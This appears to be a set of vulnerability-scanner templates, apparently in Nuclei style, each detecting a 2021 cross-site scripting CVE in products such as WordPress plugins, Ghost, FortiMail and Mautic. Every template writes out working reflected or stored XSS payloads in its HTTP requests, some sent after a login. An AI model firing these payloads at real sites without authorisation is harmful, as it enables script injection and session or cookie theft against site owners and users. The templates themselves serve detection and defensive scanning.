# WordPress Jannah Theme \<5.4.4 - Cross-Site Scripting
## Description
- WordPress Jannah theme before 5.4.4 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-theme,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Advantech R-SeeNet - Cross-Site Scripting
## Description
- Advantech R-SeeNet contains a cross-site scripting vulnerability in the device_graph_page.php script via the device_id parameter. A specially crafted URL by an attacker can lead to arbitrary JavaScript code execution.
- severity - medium
- tags - cve,cve2021,rseenet,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22
### Matchers

**Type - word**
- words
    1. "zlo onerror=alert(1) "
    2. Device Status Graph
- part - body
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# CHIYU TCP/IP Converter - Cross-Site Scripting
## Description
- CHIYU BF-430, BF-431 and BF-450M TCP/IP Converter devices contain a cross-site scripting vulnerability due to a lack of sanitization of the input on the components man.cgi, if.cgi, dhcpc.cgi, and ppp.cgi.
- severity - medium
- tags - cve,cve2021,chiyu,xss,iot
## Requests
- Method - GET
### URL
- {{BaseURL}}/if.cgi?redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%28{{randstr}}%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY
### Matchers

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. ">\<script>alert({{randstr}})\</script>

---
# WordPress Post Grid \<2.1.8 - Cross-Site Scripting
## Description
- WordPress Post Grid plugin before 2.1.8 contains a reflected cross-site scripting vulnerability. The slider import search feature and tab parameter of thesettings are not properly sanitized before being output back in the pages,
- severity - medium
- tags - authenticated,wpscan,cve,cve2021,xss,wp,wordpress,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/edit.php?post_type=post_grid&page=import_layouts&keyword="onmouseover=alert(document.domain)// HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. value="\"onmouseover=alert(document.domain)/">
    2. Post Grid
- condition - and

**Type - status**
- status
    1. 200

---
# Cyberoam NetGenie Cross-Site Scripting
## Description
- Cyberoam NetGenie C0101B1-20141120-NG11VO devices through 2021-08-14 are susceptible to reflected cross-site scripting via the 'u' parameter of ft.php.
- severity - medium
- tags - cve2021,cyberoam,netgenie,xss,router,seclists,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Verint Workforce Optimization 15.2.8.10048 - Cross-Site Scripting
## Description
- Verint Workforce Optimization 15.2.8.10048 contains a cross-site scripting vulnerability via the control/my_notifications NEWUINAV parameter.
- severity - medium
- tags - cve,cve2021,xss,verint
## Requests
### Step - 1
```
GET /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3C%2Fh1%3E26 HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
POST /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3Ch1%3E%26 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

browserCheckEnabled=true&username=admin&language=en_US&defaultHttpPort=80&screenHeight=1080&screenWidth=1920&pageModelType=0&pageDirty=false&pageAction=Login&csrfp_login={{csrfp_login}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<h1>Test\</h1>26" class="loginUserNameText

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- part - header
- internal - True
- name - csrfp_login
- group - 1
- regex
    1. csrfp_login=([a-zA-Z0-9]+);

---
# WordPress Elementor Website Builder \<3.1.4 - Cross-Site Scripting
## Description
- WordPress Elementor Website Builder plugin before 3.1.4 contains a DOM cross-site scripting vulnerability. It does not sanitize or escape user input appended to the DOM via a malicious hash.

- severity - medium
- tags - wordpress,wp-plugin,elementor,wpscan,cve,cve2021,dom,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/elementor/assets/js/frontend.min.js
- {{BaseURL}}/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9
### Matchers

**Type - regex**
- part - body_1
- regex
    1. elementor[\s-]*v(([0-3]+\.(([0-5]+\.[0-5]+)|[0-4]+\.[0-9]+))|[0-2]+[0-9.]+)

**Type - dsl**
- dsl
    1. compare_versions(version, '> 1.5.0', '\< 3.1.4') && status_code_1 == 200 && status_code_2 == 200
### Extractors

**Type - regex**
- name - version
- group - 1
- regex
    1. elementor[\s-]*v(([0-3]+\.(([0-5]+\.[0-5]+)|[0-4]+\.[0-9]+))|[0-2]+[0-9.]+)
- internal - True

**Type - kval**
- kval
    1. version

---
# WordPress Duplicate Page or Post \<1.5.1 - Cross-Site Scripting
## Description
- WordPress Duplicate Page or Post plugin before 1.5.1 contains a stored cross-site scripting vulnerability. The plugin does not have any authorization and has a flawed cross-site request forgery check in the wpdevart_duplicate_post_parametrs_save_in_db AJAX action, allowing unauthenticated users to call it and change the plugin's settings, or perform such attack via cross-site request forgery.

- severity - low
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

action=wpdevart_duplicate_post_parametrs_save_in_db&title_prefix=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2fXSS%2f%29+p

```
### Step - 3
```
GET /wp-admin/admin.php?page=wpda_duplicate_post_menu HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. style=animation-name:rotation onanimationstart=alert(/XSS/) p
    2. toplevel_page_wpda_duplicate_post_menu
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Jenzabar 9.2x-9.2.2 - Cross-Site Scripting
## Description
- Jenzabar 9.2.x through 9.2.2 contains a cross-site scripting vulnerability. It allows /ics?tool=search&query.
- severity - medium
- tags - packetstorm,cve,cve2021,jenzabar,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. >\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# myfactory FMS  -  Cross-Site Scripting
## Description
- myfactory.FMS before 7.1-912 allows cross-site scripting via the Error parameter.
- severity - medium
- tags - cve,cve2021,myfactory,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# Ghost CMS \<=4.32 - Cross-Site Scripting
## Description
- Ghost CMS 4.0.0 to 4.3.2 contains a DOM cross-site scripting vulnerability. An unused endpoint added during the development of 4.0.0 allows attackers to gain access by getting logged-in users to click a link containing malicious code.
- severity - medium
- tags - cve,cve2021,xss,ghost
## Requests
- Method - GET
### URL
- {{BaseURL}}/ghost/preview
### Matchers

**Type - word**
- words
    1. XMLHttpRequest.prototype.open
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# FlatPress 1.2.1 - Stored Cross-Site Scripting
## Description
- FlatPress 1.2.1 contains a stored cross-site scripting vulnerability that allows for arbitrary execution of JavaScript commands through blog content. An attacker can possibly steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,cve2021,flatpress,xss,authenticated,oss
## Requests
### Step - 1
```
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykGJmx9vKsePrMkVp

------WebKitFormBoundarykGJmx9vKsePrMkVp
Content-Disposition: form-data; name="user"

{{username}}
------WebKitFormBoundarykGJmx9vKsePrMkVp
Content-Disposition: form-data; name="pass"

{{password}}
------WebKitFormBoundarykGJmx9vKsePrMkVp
Content-Disposition: form-data; name="submit"

Login
------WebKitFormBoundarykGJmx9vKsePrMkVp--

```
### Step - 2
```
GET /admin.php?p=entry&action=write HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
POST /admin.php?p=entry&action=write HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_wpnonce={{nonce}}&_wp_http_referer=%2Fadmin.php%3Fp%3Dentry%26action%3Dwrite&subject=abcd&timestamp=&entry=&attachselect=--&imageselect=--&content=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&save=Publish

```
### Step - 4
```
GET /index.php/2022/10 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_4, '\<p>\<script>alert(document.cookie)\</script>\</p>')
    2. contains(body_4, 'FlatPress')
    3. contains(all_headers_4, 'text/html')
    4. status_code_4 == 200
- condition - and
### Extractors

**Type - regex**
- internal - True
- name - nonce
- part - body
- group - 1
- regex
    1. name="_wpnonce" value="([0-9a-z]+)" />

---
# WordPress iQ Block Country \<=1.2.11 - Cross-Site Scripting
## Description
- WordPress iQ Block Country plugin 1.2.11 and prior contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,wp-plugin,iq-block-country,cve2021,wordpress,wp,xss,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
POST /wp-admin/options.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

option_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test</textarea><script>alert(document.domain)</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on

```
### Step - 4
```
GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_4, "text/html")
    2. status_code_4 == 200
    3. contains(body_4, 'blockcountry_blockmessage\">test\</textarea>\<script>alert(document.domain)\</script>')
    4. contains(body_4, '\<h3>Block type\</h3>')
- condition - and
### Extractors

**Type - regex**
- name - nonce
- group - 1
- regex
    1. name="_wpnonce" value="([0-9a-zA-Z]+)"
- internal - True

---
# Vehicle Service Management System 1.0 - Cross Site Scripting
## Description
- Vehicle Service Management System 1.0 contains a cross-site scripting vulnerability via the User List section in login panel.

- severity - medium
- tags - cve,cve2021,xss,vms,authenticated
## Requests
### Step - 1
```
POST /vehicle_service/classes/Login.php?f=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{username}}&password={{password}}

```
### Step - 2
```
POST /vehicle_service/classes/Users.php?f=save HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

firstname=test1%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&lastname=test&username=test&password=test&type=1

```
### Step - 3
```
GET /vehicle_service/admin/?page=user/list HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_3, 'text/html')
    2. status_code_3 == 200
    3. contains(body_3, "\<script>alert(document.domain)\</script> Test\</td>")
- condition - and

---
# WordPress Pro Real Estate 7 Theme \<3.1.1 - Cross-Site Scripting
## Description
- WordPress Pro Real Estate 7 theme before 3.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the ct_community parameter in its search listing page before outputting it back.

- severity - medium
- tags - cve,cve2021,xss,wordpress,wpscan
## Requests
### Step - 1
```
GET /?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

```
### Matchers

**Type - word**
- words
    1. \<script>alert(document.domain);\</script>
    2. /wp-content/themes/realestate
- part - body
- condition - and

**Type - status**
- status
    1. 200

---
# Redwood Report2Web 4.3.4.5 & 4.5.3 - Cross-Site Scripting
## Description
- Redwood Report2Web 4.3.4.5 and 4.5.3 contains a cross-site scripting vulnerability in the login panel which allows remote attackers to inject JavaScript via the signIn.do urll parameter.
- severity - medium
- tags - cve,cve2021,redwood,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. >\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Triconsole Datepicker Calendar \<3.77 - Cross-Site Scripting
## Description
- Triconsole Datepicker Calendar before 3.77 contains a cross-site scripting vulnerability in calendar_form.php. Attackers can read authentication cookies that are still active, which can be used to perform further attacks such as reading browser history, directory listings, and file contents.

- severity - medium
- tags - xss,edb,cve,cve2021,triconsole
## Requests
- Method - GET
### URL
- {{BaseURL}}/calendar/calendar_form.php/">\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. \<title>TriConsole.com - PHP Calendar Date Picker\</title>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# FV Flowplayer Video Player WordPress plugin  - Authenticated Cross-Site Scripting
## Description
- The FV Flowplayer Video Player WordPress plugin is vulnerable to Reflected Cross-Site Scripting via the player_id parameter found in the ~/view/stats.php file which allows attackers to inject arbitrary web scripts in versions 7.5.0.727 - 7.5.2.727.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp,wp-plugin,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=fv_player_stats&player_id=1</script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>
    2. \<h1>FV Player Stats\</h1>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Sourcecodester Car Rental Management System 1.0 - Stored Cross-Site Scripting
## Description
- Sourcecodester Car Rental Management System 1.0 is vulnerable to cross-site scripting via the vehicalorcview parameter.
- severity - medium
- tags - sourcecodester,authenticated,edb,cve,cve2021,xss
## Requests
### Step - 1
```
POST /admin/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Connection: close

username={{username}}&password={{password}}&login=

```
### Step - 2
```
POST /admin/post-avehical.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypWqYipqU21aYgccv

------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="vehicletitle"

Test
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="brandname"

1
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="vehicalorcview"

</script><script>alert(document.domain)</script>
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="priceperday"

500
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="fueltype"

Petrol
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="modelyear"

2022
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="seatingcapacity"

5
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img1"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img2"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img3"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img4"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img5"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="submit"


------WebKitFormBoundarypWqYipqU21aYgccv--

```
### Step - 3
```
GET / HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Mautic \<3.3.4 - Cross-Site Scripting
## Description
- Mautic before 3.3.4 contains a cross-site scripting vulnerability on the password reset page in the bundle parameter of the URL. An attacker can inject arbitrary script, steal cookie-based authentication credentials, and/or launch other attacks.
- severity - medium
- tags - cve,cve2021,mautic,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/passwordreset?bundle=';alert(document.domain);var+ok='
### Matchers

**Type - word**
- part - body
- words
    1. '';alert(document.domain);var ok='
    2. mauticBasePath
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Accela Civic Platform \<=21.1 - Cross-Site Scripting
## Description
- Accela Civic Platform through 21.1 contains a cross-site scripting vulnerability via the security/hostSignon.do parameter servProvCode.
- severity - medium
- tags - cve2021,accela,xss,edb,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/security/hostSignon.do?hostSignOn=true&servProvCode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9
### Matchers

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- words
    1. "k3woq"^confirm(document.domain)^"a2pbrnzx5a9"
    2. servProvCode
- condition - and

**Type - status**
- status
    1. 200

---
# Reprise License Manager 14.2 - Cross-Site Scripting
## Description
- Reprise License Manager 14.2 contains a cross-site scripting vulnerability in the /goform/activate_process "count" parameter via GET.

- severity - medium
- tags - cve,cve2021,reprise,xss,seclists
## Requests
- Method - GET
### URL
- {{BaseURL}}/goform/activate_process?isv=&akey=&hostid=&count=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. value="">\<script>alert(document.domain)\</script>">\<input type=
    2. value: ">\<script>alert(document.domain)\</script>)\<br>
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Jannah Theme \<5.4.5 - Cross-Site Scripting
## Description
- WordPress Jannah theme before 5.4.5 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the 'query' POST parameter in its tie_ajax_search AJAX action.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-theme,wpscan
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>

```
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Transposh Translation \<1.0.8 - Cross-Site Scripting
## Description
- WordPress Transposh Translation plugin before 1.0.8 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the a parameter via an AJAX action (available to both unauthenticated and authenticated users when the curl library is installed) before outputting it back in the response.
- severity - medium
- tags - cve2021,wordpress,wp-plugin,xss,wp,wpscan,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=\<img%20src%3dx%20onerror%3dalert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. \<img src=x onerror=alert(document.domain)>
    2. {"result":
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Sourcecodester Online Event Booking and Reservation System 2.3.0 - Cross-Site Scripting
## Description
- Sourcecodester Online Event Booking and Reservation System 2.3.0 contains a cross-site scripting vulnerability in PHP/MySQL via the msg parameter to /event-management/index.php. An attacker can leverage this vulnerability in order to change the visibility of the website. Once the target user clicks on a given link, the content of the HTML code of the attacker's choice displays.

- severity - medium
- tags - cve,cve2021,xss
## Requests
### Step - 1
```
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

name={{username}}&pwd={{password}}

```
### Step - 2
```
GET /views/index.php?msg=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</i>\<script>alert(document.domain)\</script>\</div>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Fortinet FortiMail 7.0.1 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in FortiMail may allow an unauthenticated attacker to perform an attack via specially crafted HTTP GET requests to the FortiGuard URI protection service.
- severity - medium
- tags - cve,cve2021,fortimail,xss,fortinet,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com\<Svg%2Fonload%3Dalert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. \<Svg/onload=alert(document.domain)>
    2. FortiMail Click Protection
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Contact Form 7 Skins \<=2.5.0 - Cross-Site Scripting
## Description
- WordPress Contact Form 7 Skins plugin 2.5.0 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the tab parameter before outputting it back in an admin page.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,wp-plugin,xss,contactform,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=cf7skins&tab=%27%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<img src onerror=alert(document.domain)>' type='hidden

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# QSAN Storage Manager \<3.3.3 - Cross-Site Scripting
## Description
- QSAN Storage Manager before 3.3.3 contains a reflected cross-site scripting vulnerability.  Header page parameters do not filter special characters. Remote attackers can inject JavaScript to access and modify specific data.

- severity - medium
- tags - cve,cve2021,xss,qsan,storage
## Requests
- Method - GET
### URL
- {{BaseURL}}/http_header.php
### Matchers

**Type - word**
- part - body
- words
    1. "HTTP_X_TRIGGER_XSS":"\<script>alert(1)\</script>"

**Type - word**
- part - header
- words
    1. text/html

**Type - dsl**
- dsl
    1. !contains(tolower(all_headers), 'x-xss-protection')

---
# WordPress WooCommerce \<1.13.22 - Cross-Site Scripting
## Description
- WordPress WooCommerce before 1.13.22 contains a reflected cross-site scripting vulnerability via the slider import search feature because it does not properly sanitize the keyword GET parameter.
- severity - medium
- tags - cve,cve2021,xss,wp,wordpress,wp-plugin,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/edit.php?post_type=wcps&page=import_layouts&keyword="onmouseover%3Dalert%28document.domain%29%3B%2F%2F HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. value="\"onmouseover=alert(document.domain);//">
    2. PickPlugins Product Slider
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Persian Woocommerce \<=5.8.0 - Cross-Site Scripting
## Description
- WordPress Persian Woocommerce plugin through 5.8.0 contains a cross-site scripting vulnerability. The plugin does not escape the s parameter before outputting it back in an attribute in the admin dashboard. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site and possibly steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - wp,xss,authenticated,wpscan,cve,cve2021,wordpress,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=persian-wc&s=xxxxx%22+accesskey%3DX+onclick%3Dalert%281%29+test%3D%22 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, "text/html")
    2. status_code_2 == 200
    3. contains(body_2, 'accesskey=X onclick=alert(1) test=')
    4. contains(body_2, 'woocommerce_persian_translate')
- condition - and

---
# Easy Social Feed \< 6.2.7 - Cross-Site Scripting
## Description
- Easy Social Feed \< 6.2.7 is susceptible to reflected cross-site scripting because the plugin does not sanitize and escape a parameter before outputting it back in an admin dashboard page, leading to it being executed in the context of a logged admin or editor.
- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,xss,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. 'type' : '\</script>\<script>alert(document.domain)\</script>'

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ehicle Service Management System 1.0 - Cross-Site Scripting
## Description
- Vehicle Service Management System 1.0 contains a stored cross-site scripting vulnerability via the Category List section in login panel.

- severity - medium
- tags - cve,cve2021,xss,vms,authenticated
## Requests
### Step - 1
```
POST /classes/Login.php?f=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{username}}&password={{password}}

```
### Step - 2
```
POST /classes/Master.php?f=save_category HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

id=&category=%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&status=1

```
### Step - 3
```
GET /admin/?page=maintenance/category HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_3, 'text/html')
    2. status_code_3 == 200
